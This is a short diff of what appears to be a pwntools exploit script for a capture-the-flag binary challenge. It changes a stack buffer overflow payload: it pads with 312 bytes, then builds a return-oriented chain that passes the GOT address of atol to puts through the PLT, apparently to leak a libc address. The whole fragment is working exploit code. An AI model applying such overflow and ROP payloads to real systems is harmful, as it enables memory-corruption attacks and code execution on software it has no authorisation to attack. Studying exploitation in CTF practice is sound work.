@@ -9,14 +9,14 @@ pause()
 
 p.recv()
 
-p.sendline('3590')
+p.sendline('5570')
 
 p.recv()
-payload = 'a' * 400
+payload = 'a' * 312
 
 payload +=  p64(0x4008f3)
-payload += p64(e.got['printf'])
-payload += p64(e.plt['printf'])
+payload += p64(e.got['atol'])
+payload += p64(e.plt['puts'])
 
 
 p.sendline(payload)
